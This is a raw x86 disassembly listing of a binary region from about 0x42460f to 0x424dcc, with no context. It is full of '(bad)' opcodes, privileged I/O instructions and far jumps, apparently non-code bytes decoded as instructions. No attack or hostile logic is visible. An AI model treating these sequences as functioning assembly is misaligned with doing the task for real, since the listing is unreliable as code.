  42460f:	mov    al,0x5a
  424611:	sbb    eax,0x3526d752
  424616:	test   DWORD PTR [esp+ecx*1],eax
  424619:	or     eax,0x205e5ff9
  42461e:	ss push 0xfffffff5
  424621:	mov    dl,0xc9
  424623:	jae    0x9679c3dd
  424629:	add    BYTE PTR [edi+0x48676b3c],0x76
  424630:	sbb    BYTE PTR [edi+0x3266f26b],dl
  424636:	inc    eax
  424637:	pushf  
  424638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424639:	inc    ebp
  42463a:	test   DWORD PTR [eax+0x7fc34f11],edi
  424640:	jg     0x4245c5
  424642:	xchg   ebp,eax
  424643:	pop    edi
  424644:	(bad)
  424647:	mov    dh,0x39
  424649:	stos   DWORD PTR es:[edi],eax
  42464a:	xlat   BYTE PTR ds:[ebx]
  42464b:	cwde   
  42464c:	mov    edx,DWORD PTR [edi+0x2eca09ae]
  424652:	dec    eax
  424653:	pushf  
  424654:	jle    0x4245ed
  424656:	in     eax,0x48
  424658:	scas   al,BYTE PTR es:[edi]
  424659:	sbb    al,0x8d
  42465b:	xchg   ecx,eax
  42465c:	mov    edi,eax
  42465e:	aad    0x21
  424660:	push   eax
  424661:	pop    ecx
  424662:	jmp    0x424601
  424664:	xchg   edx,eax
  424665:	dec    esp
  424666:	test   eax,0x88ea8a97
  42466b:	pop    ss
  42466c:	add    BYTE PTR [edx],al
  42466e:	cld    
  42466f:	pop    esi
  424670:	pop    ss
  424671:	in     al,0xe9
  424673:	icebp  
  424674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424675:	inc    eax
  424676:	dec    esi
  424677:	adc    eax,0x8b1058c5
  42467c:	xchg   ebx,eax
  42467d:	aaa    
  42467e:	cmp    al,0x9a
  424680:	mov    esi,0x5c0b9468
  424685:	jnp    0x424633
  424687:	dec    esp
  424688:	(bad)  
  424689:	ins    BYTE PTR es:[edi],dx
  42468a:	and    eax,DWORD PTR [eax-0x2]
  42468d:	pop    ss
  42468e:	cmp    DWORD PTR [ecx+0x5d],esi
  424691:	sbb    DWORD PTR [ebx],eax
  424693:	mov    ds:0x74fbd46c,eax
  424698:	and    eax,DWORD PTR [edi]
  42469a:	inc    ebp
  42469b:	cs push ebp
  42469d:	and    eax,0xbbc79fb2
  4246a2:	adc    bh,dh
  4246a4:	jno    0x4246cc
  4246a6:	push   ecx
  4246a7:	add    ebp,esi
  4246a9:	fnsave [edi-0x35]
  4246ac:	shrd   DWORD PTR [edx],edx,0x22
  4246b0:	push   eax
  4246b1:	clc    
  4246b2:	or     al,0xd4
  4246b4:	inc    ebp
  4246b5:	into   
  4246b6:	xor    eax,0x168acbcf
  4246bb:	push   es
  4246bc:	sub    edi,eax
  4246be:	jo     0x42465f
  4246c0:	jmp    0x75cb:0xc133d5eb
  4246c7:	jle    0x424660
  4246c9:	inc    edi
  4246ca:	inc    eax
  4246cb:	adc    esi,esp
  4246cd:	cmc    
  4246ce:	aam    0x83
  4246d0:	sbb    al,0xd6
  4246d2:	xor    cl,BYTE PTR [eax]
  4246d4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4246d6:	adc    ebp,DWORD PTR [esp+edi*2]
  4246d9:	dec    edi
  4246da:	sub    BYTE PTR [eax],dl
  4246dc:	lods   eax,DWORD PTR ds:[esi]
  4246dd:	push   cs
  4246de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246df:	mov    eax,0x836bec7b
  4246e4:	hlt    
  4246e5:	or     DWORD PTR [edi+0x5d],ebp
  4246e8:	pop    ebx
  4246e9:	or     eax,0xa0801da1
  4246ee:	pop    esi
  4246ef:	or     BYTE PTR [esi-0x22910bcc],dh
  4246f5:	pop    esp
  4246f6:	js     0x424680
  4246f8:	dec    esp
  4246f9:	mov    edx,0xe8352536
  4246fe:	test   eax,0x4c7ee5ac
  424703:	push   cs
  424704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424705:	mov    dl,BYTE PTR [ecx+0x1f]
  424708:	fdivr  st,st(7)
  42470a:	adc    DWORD PTR [ebp+eax*4+0x7ddb4c40],edi
  424711:	push   ebx
  424712:	test   edi,edi
  424714:	scas   eax,DWORD PTR es:[edi]
  424715:	lea    ebp,[ebp+0x45]
  424718:	imul   eax,DWORD PTR [edi-0x3a],0xffffffa0
  42471c:	xchg   edi,eax
  42471d:	hlt    
  42471e:	jo     0x42473e
  424720:	mov    ecx,0x50bd0602
  424725:	pop    eax
  424726:	popf   
  424727:	mov    eax,ds:0x725791a6
  42472c:	add    BYTE PTR [esi+0x4d],bl
  42472f:	out    dx,al
  424730:	xchg   ebx,eax
  424731:	jbe    0x4246c4
  424733:	jle    0x4246f2
  424735:	xlat   BYTE PTR ds:[ebx]
  424736:	es cmp eax,0x8012e7c1
  42473c:	push   cs
  42473d:	add    DWORD PTR [eax],0x19
  424740:	ret    0xbdc8
  424743:	push   esi
  424744:	sub    BYTE PTR [esi-0x4bccf416],ah
  42474a:	pop    esi
  42474b:	or     DWORD PTR [esi],edi
  42474d:	rcr    BYTE PTR [edx],1
  42474f:	and    DWORD PTR [esi+0x1e8a6a44],ebx
  424755:	std    
  424756:	pop    esi
  424757:	or     al,0x35
  424759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42475a:	mov    ch,0x64
  42475c:	out    0x94,al
  42475e:	mov    edx,0xa6c1b330
  424763:	retf   0xf007
  424766:	scas   al,BYTE PTR es:[edi]
  424767:	pop    ebp
  424768:	out    0x94,al
  42476a:	aad    0x17
  42476c:	into   
  42476d:	shl    edi,1
  42476f:	xchg   esi,eax
  424770:	push   ds
  424771:	div    BYTE PTR [edi-0x69]
  424774:	aas    
  424775:	(bad)
  424778:	xchg   ecx,eax
  424779:	sub    eax,0x8bebf555
  42477e:	(bad)  
  42477f:	mov    al,0xa5
  424781:	outs   dx,BYTE PTR ds:[esi]
  424782:	mov    al,0x14
  424784:	ficomp DWORD PTR [ebx-0x4f]
  424787:	pop    ds
  424788:	sbb    cl,al
  42478a:	add    ebx,DWORD PTR [esi-0xa]
  42478d:	arpl   WORD PTR [edx+0x5f9fee98],sp
  424793:	(bad)  
  424794:	pusha  
  424795:	es and dh,0x13
  424799:	push   esi
  42479a:	test   DWORD PTR [ebx],esp
  42479c:	(bad)  
  42479d:	push   eax
  42479e:	mov    ebx,0x92505697
  4247a3:	mov    ds:0xb89f021b,eax
  4247a8:	inc    esp
  4247a9:	(bad)  
  4247ab:	or     BYTE PTR [esi+0x3d],ch
  4247ae:	mov    edi,0xb382e2ed
  4247b3:	cdq    
  4247b4:	cmp    DWORD PTR [ebx-0x7c95f0fb],0x4c8fe00f
  4247be:	fwait
  4247bf:	(bad)  
  4247c0:	leave  
  4247c1:	cld    
  4247c2:	iret   
  4247c3:	jmp    0x4c6ffceb
  4247c8:	adc    ah,cl
  4247ca:	or     eax,0x706cb224
  4247cf:	repz xchg ecx,eax
  4247d1:	xchg   edi,eax
  4247d2:	lods   al,BYTE PTR ds:[esi]
  4247d3:	aam    0x94
  4247d5:	ret    0x9344
  4247d8:	outs   dx,DWORD PTR ds:[esi]
  4247d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247da:	loopne 0x4247ee
  4247dc:	test   eax,0xec21f77a
  4247e1:	dec    edx
  4247e2:	ror    BYTE PTR [edx],0xcf
  4247e5:	cmp    edi,DWORD PTR ds:0x2039be9e
  4247eb:	dec    ebx
  4247ec:	rcl    DWORD PTR [edx+0xd1b7aca],1
  4247f2:	sub    ah,0x17
  4247f5:	fadd   QWORD PTR [ebp+edx*1-0x5eecd282]
  4247fc:	clc    
  4247fd:	fcomp  QWORD PTR [ecx-0x3c5a3e4b]
  424803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424804:	push   cs
  424805:	adc    eax,0x9679b47a
  42480a:	popa   
  42480b:	mov    ecx,0x3694ed43
  424810:	add    BYTE PTR [edi+0x51c81b1c],dl
  424816:	dec    eax
  424817:	inc    ebp
  424818:	lock push edx
  42481a:	in     eax,dx
  42481b:	mov    ds:0xf1f4719e,al
  424820:	je     0x4247e0
  424822:	dec    esi
  424823:	ds xchg BYTE PTR ds:[ebx+0x49f51f65],dl
  42482b:	out    0xa2,eax
  42482d:	mov    ds,WORD PTR [esi-0x56]
  424830:	adc    eax,0xa2ef2367
  424835:	push   ebp
  424836:	pop    ecx
  424837:	mov    ecx,0x2154a1c6
  42483c:	mov    edi,0x54226c6
  424841:	dec    ebp
  424842:	cli    
  424843:	mov    esp,0x5286d27c
  424848:	mov    esi,0x7afea79b
  42484d:	aaa    
  42484e:	icebp  
  42484f:	cmp    DWORD PTR [ebx-0x4b],eax
  424852:	sub    al,BYTE PTR [ebp-0x2d8ac603]
  424858:	mov    ebx,0x4c340f78
  42485d:	ss xchg edi,eax
  42485f:	aam    0xac
  424861:	dec    ebx
  424862:	in     eax,dx
  424863:	push   edx
  424864:	mov    dl,0x54
  424866:	addr16 mov ebx,0xc8dd45e
  42486c:	jmp    0x424818
  42486e:	shr    BYTE PTR ds:0x806357fc,0x65
  424875:	dec    edx
  424876:	mov    ebp,esp
  424878:	jae    0x4248b5
  42487a:	cmp    edi,DWORD PTR ss:[edi]
  42487d:	in     eax,0x28
  42487f:	pusha  
  424880:	push   esp
  424881:	sbb    DWORD PTR [edx-0x50],esp
  424884:	ret    
  424885:	pushf  
  424886:	(bad)  
  424887:	aam    0xfa
  424889:	stc    
  42488a:	xchg   ebp,eax
  42488b:	fxtract 
  42488d:	rcl    dl,1
  42488f:	and    esp,0xf255296b
  424895:	int    0x2c
  424897:	xor    dh,al
  424899:	imul   eax,esp,0x7285befd
  42489f:	call   0x29fb0c3e
  4248a4:	inc    ebp
  4248a5:	xchg   edx,eax
  4248a6:	fisttp DWORD PTR [esi+eiz*8-0x444caced]
  4248ad:	leave  
  4248ae:	repnz scas al,BYTE PTR es:[edi]
  4248b0:	jno    0x42488f
  4248b2:	fisttp QWORD PTR [eax+edi*2]
  4248b5:	add    eax,DWORD PTR [edx+0xabc325]
  4248bb:	mov    al,0xa3
  4248bd:	adc    DWORD PTR [esi-0x2e294e96],ebx
  4248c3:	xchg   bh,dh
  4248c5:	pop    ebx
  4248c6:	xchg   esp,eax
  4248c7:	xchg   DWORD PTR ss:[ecx],edi
  4248ca:	jge    0x424875
  4248cc:	bound  esi,QWORD PTR [ebp+0x51b080d]
  4248d2:	popa   
  4248d3:	loopne 0x42486c
  4248d5:	add    cl,dh
  4248d7:	mov    ebx,0x988a7597
  4248dc:	mov    edx,0x49bf9c11
  4248e1:	mov    ch,0xcc
  4248e3:	push   eax
  4248e4:	int    0x89
  4248e6:	in     al,dx
  4248e7:	lock je 0x424903
  4248ea:	xlat   BYTE PTR ds:[ebx]
  4248eb:	ja     0x424872
  4248ed:	or     eax,0xee398af6
  4248f2:	push   0xc2ccc979
  4248f7:	dec    ebp
  4248f8:	push   0x20b268fb
  4248fd:	enter  0x2517,0xb6
  424901:	outs   dx,BYTE PTR ds:[esi]
  424902:	sbb    ah,dl
  424904:	jge    0x42490f
  424906:	lods   al,BYTE PTR ds:[esi]
  424907:	fnstcw WORD PTR fs:[ebp+ebp*1+0x5a]
  42490c:	arpl   sp,cx
  42490e:	push   edi
  42490f:	(bad)  
  424910:	inc    esi
  424911:	pop    ecx
  424912:	loop   0x424949
  424914:	jnp    0x42495e
  424916:	int    0xef
  424918:	fs pop ebp
  42491a:	jl     0x424978
  42491c:	xchg   BYTE PTR [edx+eax*8+0x3d],al
  424920:	sub    al,0x37
  424922:	and    edi,DWORD PTR [edi+0x3857b353]
  424928:	adc    ah,BYTE PTR [eax]
  42492a:	sbb    DWORD PTR [ecx],edx
  42492c:	or     bh,ch
  42492e:	lds    ecx,FWORD PTR [esi]
  424930:	sti    
  424931:	jge    0x4248e6
  424933:	loopne 0x4248c1
  424935:	fstp   DWORD PTR [esi-0x5b]
  424938:	adc    dh,dl
  42493a:	out    0xca,al
  42493c:	jne    0x424956
  42493e:	mov    ch,0xad
  424940:	mov    BYTE PTR [eax+eax*4-0x3a9c6c71],bl
  424947:	jmp    0x4248d4
  424949:	mov    edx,0xe65de191
  42494e:	lea    eax,[esi]
  424950:	hlt    
  424951:	fdiv   DWORD PTR [edi-0x61]
  424954:	lahf   
  424955:	xchg   edx,eax
  424956:	or     ecx,DWORD PTR [ebp+0x3cbfffe1]
  42495c:	mov    edx,0x5495428b
  424961:	jg     0x4249b7
  424963:	pop    esi
  424964:	lods   al,BYTE PTR ds:[esi]
  424965:	lock mov ah,0xbd
  424968:	jo     0x4249db
  42496a:	dec    esi
  42496b:	cdq    
  42496c:	mov    esp,0x1448455b
  424971:	and    al,0xe0
  424973:	jle    0x42494e
  424975:	mov    cl,cl
  424977:	stos   BYTE PTR es:[edi],al
  424978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424979:	push   ss
  42497a:	jl     0x42493f
  42497c:	int    0xe8
  42497e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42497f:	out    dx,eax
  424980:	fsub   QWORD PTR [eax]
  424982:	add    BYTE PTR [esi],ah
  424984:	cwde   
  424985:	rol    DWORD PTR [edx+0x28],1
  424988:	ret    
  424989:	(bad)  [edi]
  42498b:	xchg   BYTE PTR [ecx+0x4a],cl
  42498e:	es int3 
  424990:	sub    bl,BYTE PTR [edx+0x3e]
  424993:	xchg   DWORD PTR [edx-0x2f],edi
  424996:	lods   eax,DWORD PTR ds:[esi]
  424997:	sub    ch,BYTE PTR ds:0x10efc016
  42499d:	nop
  42499e:	pop    edx
  42499f:	loopne 0x424938
  4249a1:	add    DWORD PTR [edx+edx*1+0x1ef23dd0],edx
  4249a8:	pop    es
  4249a9:	push   ecx
  4249aa:	out    dx,al
  4249ab:	add    al,0xe7
  4249ad:	imul   ebp,DWORD PTR [ecx],0xffffffe3
  4249b0:	inc    ecx
  4249b1:	mov    edi,0xec45c20f
  4249b6:	shl    DWORD PTR [eax],1
  4249b8:	inc    ebx
  4249b9:	xor    al,0x85
  4249bb:	xor    ebx,esi
  4249bd:	jb     0x424a1e
  4249bf:	cmp    eax,0x324b1ffb
  4249c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249c5:	inc    ebp
  4249c6:	jl     0x424a09
  4249c8:	ins    DWORD PTR es:[edi],dx
  4249c9:	sti    
  4249ca:	sbb    BYTE PTR [ecx-0x1ed0ba33],ah
  4249d0:	lds    eax,FWORD PTR [ebx+eax*8-0x48c698b2]
  4249d7:	xchg   esi,eax
  4249d8:	cmp    al,0xe3
  4249da:	inc    ebp
  4249db:	je     0x4249c5
  4249dd:	mov    ds:0x4e038018,eax
  4249e2:	add    DWORD PTR [ebp-0x606bc9e2],esp
  4249e8:	jp     0x42497f
  4249ea:	push   esi
  4249eb:	cli    
  4249ec:	mov    ds,WORD PTR [ecx+0x33396ab4]
  4249f2:	mov    ch,0x4
  4249f4:	mov    eax,ds:0x62b056af
  4249f9:	sub    eax,0x4b
  4249fc:	push   ds
  4249fd:	adc    esi,DWORD PTR [ebp+0x7]
  424a00:	rcr    DWORD PTR [esi+0x34d1bd11],0x38
  424a07:	dec    esp
  424a08:	neg    al
  424a0a:	push   ds
  424a0b:	dec    ecx
  424a0c:	out    dx,eax
  424a0d:	fstp   QWORD PTR [edi-0xb]
  424a10:	(bad)  
  424a11:	cmp    eax,0x9926ccc6
  424a16:	mov    cl,0x4f
  424a18:	jmp    0xc1f7:0x891c44cf
  424a1f:	out    0x59,al
  424a21:	stos   DWORD PTR es:[edi],eax
  424a22:	mov    eax,0x8557cd1b
  424a27:	repz xor eax,0x44ba9c03
  424a2d:	rol    DWORD PTR [eax+0x400c794d],cl
  424a33:	and    DWORD PTR [edi-0x3f],esi
  424a36:	mov    DWORD PTR [esi-0x2200bd8],eax
  424a3c:	mov    cl,0x3e
  424a3e:	jnp    0x424a3c
  424a40:	inc    eax
  424a41:	add    eax,0x5bf9c572
  424a46:	cld    
  424a47:	mov    dl,0x39
  424a49:	xchg   DWORD PTR [edx+0x61d8ab7c],ebx
  424a4f:	jle    0x424aab
  424a51:	test   DWORD PTR [edx+0x49e83823],esi
  424a57:	push   eax
  424a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a59:	xor    DWORD PTR [esi-0x6b090d8],ebp
  424a5f:	jb     0x424a71
  424a61:	dec    edx
  424a62:	test   ecx,0xb70926f1
  424a68:	add    BYTE PTR [eax],al
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	idiv   BYTE PTR [edi]
  424a78:	cmp    al,0xe1
  424a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [esi+0x18000006],al
  424a83:	jne    0x424a4d
  424a85:	sbb    BYTE PTR [ebp+0x55],al
  424a88:	scas   eax,DWORD PTR es:[edi]
  424a89:	pop    esp
  424a8a:	mov    edx,fs
  424a8c:	cmp    dl,BYTE PTR [edi-0x57]
  424a8f:	push   esp
  424a90:	push   ss
  424a91:	leave  
  424a92:	(bad)  
  424a93:	push   0xaf9c86b7
  424a98:	jns    0x424b0f
  424a9a:	push   esi
  424a9b:	(bad)  
  424a9c:	jp     0x424b0b
  424a9e:	mov    ds:0x1c5d8090,al
  424aa3:	aad    0x5f
  424aa5:	outs   dx,DWORD PTR ds:[esi]
  424aa6:	scas   al,BYTE PTR es:[edi]
  424aa7:	add    DWORD PTR [eax],edi
  424aa9:	repz xchg edx,eax
  424aab:	sub    eax,ebx
  424aad:	push   0x9e158ac9
  424ab2:	test   al,0x7c
  424ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ab5:	inc    ecx
  424ab6:	data16 adc BYTE PTR [edi+0x5eacf4cd],ah
  424abd:	xchg   ebx,eax
  424abe:	fwait
  424abf:	in     eax,0x7a
  424ac1:	je     0x424b12
  424ac3:	mov    bh,0x97
  424ac5:	xor    DWORD PTR [eax],0x178ac117
  424acb:	repnz push ebp
  424acd:	repnz add DWORD PTR [edi],0x8b22a4e9
  424ad4:	push   esi
  424ad5:	sub    BYTE PTR [eax],al
  424ad7:	ror    BYTE PTR [edx-0x23343a05],1
  424add:	test   BYTE PTR [eax-0x2dd777b1],0x68
  424ae4:	inc    ecx
  424ae5:	lock loop 0x424af2
  424ae8:	mov    ds:0xe4edf6d9,al
  424aed:	je     0x424b4f
  424aef:	test   DWORD PTR ds:0x2e2671c9,esp
  424af5:	(bad)  
  424af6:	or     ecx,DWORD PTR [ebx]
  424af8:	xor    al,0xb8
  424afa:	adc    BYTE PTR [ebp-0x228e94b1],cl
  424b00:	call   0x10a8155b
  424b05:	fidivr WORD PTR [esi+ebp*4-0x525d998b]
  424b0c:	jns    0x424aab
  424b0e:	cmp    DWORD PTR [ebp-0x6e],0xec80479
  424b15:	jmp    0x16ff1aa7
  424b1a:	adc    al,0xf5
  424b1c:	in     al,dx
  424b1d:	dec    ecx
  424b1e:	aam    0x2b
  424b20:	pop    ds
  424b21:	fs or  eax,0xbe70b0c8
  424b27:	es cs je 0x424b7b
  424b2b:	jb     0x424ac5
  424b2d:	(bad)  
  424b2e:	push   ds
  424b2f:	xor    ebp,ebp
  424b31:	rcl    DWORD PTR [edx-0x49],0xc5
  424b35:	fs iret 
  424b37:	push   es
  424b38:	adc    bl,BYTE PTR [edx]
  424b3a:	stc    
  424b3b:	fstp   DWORD PTR [ebx+0x35]
  424b3e:	and    BYTE PTR [bp+di+0x367a],dl
  424b43:	fld    TBYTE PTR [ecx]
  424b45:	test   eax,0xa953cbdc
  424b4a:	in     eax,0xc1
  424b4c:	fistp  QWORD PTR [ebx]
  424b4e:	mov    edx,DWORD PTR [esi]
  424b50:	push   ebx
  424b51:	fcom   QWORD PTR [edx]
  424b53:	aad    0xf0
  424b55:	push   0xc0384952
  424b5a:	popf   
  424b5b:	xchg   DWORD PTR [esi-0x47],ecx
  424b5e:	or     DWORD PTR [esi+0xb],ebp
  424b61:	xor    al,0xbb
  424b63:	jmp    0x424b11
  424b65:	clc    
  424b66:	jle    0x424b15
  424b68:	data16 sub al,0x13
  424b6b:	fucom  st(0)
  424b6d:	call   0x1ed3:0xd2ca27d3
  424b74:	int    0x16
  424b76:	ja     0x424b03
  424b78:	fstp   TBYTE PTR [edx-0x7b]
  424b7b:	mul    dh
  424b7d:	mov    ?,ecx
  424b7f:	pop    ecx
  424b80:	clc    
  424b81:	add    eax,0xbb00ce0c
  424b86:	add    ch,al
  424b88:	jge    0x424b56
  424b8a:	into   
  424b8b:	jnp    0x424b8a
  424b8d:	and    ecx,DWORD PTR [ebx]
  424b8f:	int3   
  424b90:	mov    al,ds:0xd249745
  424b95:	dec    ebx
  424b96:	mov    dh,0x5f
  424b98:	ss mov ebx,esp
  424b9b:	nop
  424b9c:	xor    BYTE PTR [ecx-0x74],bl
  424b9f:	fwait
  424ba0:	fwait
  424ba1:	mov    edx,0x8132fbd5
  424ba6:	pop    ebx
  424ba7:	enter  0x2798,0xdc
  424bab:	shr    DWORD PTR [esi+0x2d],0x12
  424baf:	xchg   ecx,eax
  424bb0:	inc    ebp
  424bb1:	cmc    
  424bb2:	or     esp,DWORD PTR [edi+0x7268c4bc]
  424bb8:	pop    edi
  424bb9:	outs   dx,BYTE PTR ds:[esi]
  424bba:	inc    ebx
  424bbb:	pop    eax
  424bbc:	jmp    0xf7e03a22
  424bc1:	and    edx,DWORD PTR [edi]
  424bc3:	jbe    0x424b5b
  424bc5:	sub    al,0x74
  424bc7:	bound  eax,QWORD PTR [edx+0x76ed2a4a]
  424bcd:	sub    DWORD PTR [esp+edi*8],0xffffffd3
  424bd1:	jmp    0x7d6e:0x9a500663
  424bd8:	and    eax,DWORD PTR [edi+0x1ec91b89]
  424bde:	popa   
  424bdf:	jne    0x424c3d
  424be1:	xor    DWORD PTR [esi-0x25],ebx
  424be4:	cli    
  424be5:	ds iret 
  424be7:	or     al,BYTE PTR [ecx-0x67]
  424bea:	fdiv   DWORD PTR [esp+esi*4+0x31186932]
  424bf1:	pop    edx
  424bf2:	cwde   
  424bf3:	mov    bh,0x44
  424bf5:	imul   eax,DWORD PTR [edi+ebp*8],0xffffff88
  424bf9:	adc    edi,DWORD PTR [edi-0x2b090f8f]
  424bff:	adc    BYTE PTR [ebx],ah
  424c01:	out    0x22,al
  424c03:	jbe    0x424c23
  424c05:	sahf   
  424c06:	and    bl,al
  424c08:	mov    DWORD PTR [ebp+ebp*8-0xd],ebx
  424c0c:	adc    BYTE PTR [ebx-0x3e761f4d],dh
  424c12:	pushf  
  424c13:	daa    
  424c14:	lods   eax,DWORD PTR ds:[esi]
  424c15:	stc    
  424c16:	call   0x6191:0xb7f91961
  424c1d:	xchg   esp,eax
  424c1e:	cmp    ah,BYTE PTR [esi-0x3c]
  424c21:	add    eax,0x4b9d64fe
  424c26:	mov    ds:0x19128131,al
  424c2b:	push   esp
  424c2c:	mov    dl,0x67
  424c2e:	jg     0x424bf7
  424c30:	test   BYTE PTR [ecx],bl
  424c32:	sub    cl,BYTE PTR [edi+eiz*1+0x44]
  424c36:	icebp  
  424c37:	xchg   ebp,eax
  424c38:	arpl   WORD PTR [eax-0x4],bx
  424c3b:	xor    dh,BYTE PTR [edi+edx*4]
  424c3e:	xchg   edx,eax
  424c3f:	sar    al,cl
  424c41:	imul   ebx,DWORD PTR [esi-0x3a],0x5836a1c3
  424c48:	inc    ebx
  424c49:	es (bad) 
  424c4b:	enter  0x749,0xc4
  424c4f:	and    ch,BYTE PTR [esi+0x3f7b4e79]
  424c55:	jmp    0x424c1e
  424c57:	aaa    
  424c58:	outs   dx,BYTE PTR ds:[esi]
  424c59:	lds    eax,FWORD PTR [ecx-0x7b]
  424c5c:	test   edx,edx
  424c5e:	push   esp
  424c5f:	cmp    esp,ecx
  424c61:	fimul  WORD PTR [esi]
  424c63:	pop    ecx
  424c64:	aam    0xa6
  424c66:	int3   
  424c67:	or     eax,0x65d82b4
  424c6c:	stc    
  424c6d:	daa    
  424c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c6f:	add    al,0x10
  424c71:	push   ebp
  424c72:	mov    esp,ebx
  424c74:	sbb    al,0xd1
  424c76:	xor    cl,BYTE PTR [ecx-0x18]
  424c79:	gs or  eax,0x2ae5c998
  424c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c80:	cmp    esp,DWORD PTR ds:0x58907816
  424c86:	bound  edi,QWORD PTR [edx+esi*4-0xe1194de]
  424c8d:	mov    esi,DWORD PTR [edi-0x7032b726]
  424c93:	pop    ecx
  424c94:	jl     0x424cdc
  424c96:	out    dx,al
  424c97:	mov    esp,DWORD PTR [ebp-0x493fe4bd]
  424c9d:	xor    eax,0x9bc744fc
  424ca2:	add    eax,0xd05f0f85
  424ca7:	in     eax,0x1c
  424ca9:	fs mov dh,0x63
  424cac:	iret   
  424cad:	cmp    dh,BYTE PTR [edi*1-0x71c1d5a9]
  424cb4:	xchg   ebp,eax
  424cb5:	and    edi,DWORD PTR [edi-0x78227f17]
  424cbb:	ja     0x424d23
  424cbd:	cmp    eax,0x2d2ab88f
  424cc2:	sub    al,0x29
  424cc4:	scas   al,BYTE PTR es:[edi]
  424cc5:	cmp    eax,0x4895e978
  424cca:	cld    
  424ccb:	cmc    
  424ccc:	pushf  
  424ccd:	add    eax,0xef276a30
  424cd2:	stos   BYTE PTR es:[edi],al
  424cd3:	(bad)  [esi-0x3fbc5f9b]
  424cd9:	shl    ch,1
  424cdb:	popf   
  424cdc:	fwait
  424cdd:	out    dx,eax
  424cde:	icebp  
  424cdf:	xchg   ebx,eax
  424ce0:	cli    
  424ce1:	sub    al,0x3
  424ce3:	aas    
  424ce4:	push   ebp
  424ce5:	aam    0x5f
  424ce7:	mov    ebp,0x7fb2b751
  424cec:	in     al,0x52
  424cee:	imul   edi,DWORD PTR [edx-0x64],0x7a70aef5
  424cf5:	mov    bh,0x4e
  424cf7:	add    al,0xd4
  424cf9:	sbb    al,0x78
  424cfb:	(bad)  
  424cfc:	push   edi
  424cfd:	add    al,0x85
  424cff:	xor    ebp,DWORD PTR [edx]
  424d01:	cmp    ah,BYTE PTR [edx]
  424d03:	pop    edi
  424d04:	sti    
  424d05:	leave  
  424d06:	frstor [ebx+0x34]
  424d09:	dec    esi
  424d0a:	mov    ds:0x9bab6a33,eax
  424d0f:	pop    esp
  424d10:	jbe    0x424cca
  424d12:	cdq    
  424d13:	(bad)  
  424d14:	push   ss
  424d15:	push   es
  424d16:	mov    dl,0x18
  424d18:	bound  ebx,QWORD PTR [ebx]
  424d1a:	xchg   DWORD PTR [ebx+esi*8],esp
  424d1d:	inc    ecx
  424d1e:	add    DWORD PTR [edx],esi
  424d20:	(bad)
  424d23:	in     eax,0x94
  424d25:	pop    edi
  424d26:	mov    ds:0x70ec93cb,al
  424d2b:	scas   al,BYTE PTR es:[edi]
  424d2c:	push   esp
  424d2d:	int3   
  424d2e:	pop    edx
  424d2f:	je     0x424cfa
  424d31:	dec    eax
  424d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d33:	(bad)  
  424d34:	cwde   
  424d35:	or     eax,0x108be5e5
  424d3a:	sub    al,0x4b
  424d3c:	fsubr  QWORD PTR [ecx+0x20]
  424d3f:	fmul   QWORD PTR [ebp+0x50f696dd]
  424d45:	or     dl,bh
  424d47:	mov    ebp,0x443a990a
  424d4c:	xchg   ebx,eax
  424d4d:	inc    ecx
  424d4e:	out    dx,al
  424d4f:	lea    eax,[edx]
  424d51:	sbb    DWORD PTR [ebx-0x6d27860d],0x83dccfdf
  424d5b:	inc    edi
  424d5c:	retf   
  424d5d:	mov    bh,0x2b
  424d5f:	xor    ebp,DWORD PTR [edi]
  424d61:	add    edx,esi
  424d63:	sub    dh,ah
  424d65:	and    ecx,DWORD PTR [edx]
  424d67:	aaa    
  424d68:	push   0x9811c5ae
  424d6d:	shr    BYTE PTR [edx+0x49],1
  424d70:	fisubr WORD PTR [edi]
  424d72:	mov    bl,BYTE PTR [esi]
  424d74:	adc    al,0xad
  424d76:	rcr    bh,1
  424d78:	loop   0x424d5c
  424d7a:	jp     0x424dee
  424d7c:	int3   
  424d7d:	inc    esp
  424d7e:	enter  0xecf7,0x51
  424d82:	add    bh,ah
  424d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d85:	loopne 0x424def
  424d87:	leave  
  424d88:	dec    BYTE PTR [ecx+0x2e]
  424d8b:	lods   eax,DWORD PTR ds:[esi]
  424d8c:	fidiv  DWORD PTR [ebx-0x4c12f9f8]
  424d92:	out    dx,eax
  424d93:	cmp    eax,0x3d7692a6
  424d98:	pop    ebp
  424d99:	mov    eax,DWORD PTR [ebp+0x4ade8218]
  424d9f:	or     BYTE PTR [edi+0xbbc2206],bl
  424da5:	inc    eax
  424da6:	in     eax,dx
  424da7:	jae    0x424e0e
  424da9:	dec    esp
  424daa:	mov    edi,0xaafc79a0
  424daf:	call   0xdd8f:0x35d08837
  424db6:	(bad)  
  424db7:	out    0x5b,al
  424db9:	push   cs
  424dba:	adc    DWORD PTR [ecx],ebx
  424dbc:	outs   dx,DWORD PTR ds:[esi]
  424dbd:	adc    edi,DWORD PTR [esi-0x70]
  424dc0:	mov    ebp,0x572ec16e
  424dc5:	inc    ebx
  424dc6:	xchg   esp,eax
  424dc7:	jnp    0x424dd1
  424dc9:	ret    0x7973
  424dcc:	or     eax,0x902f6a76
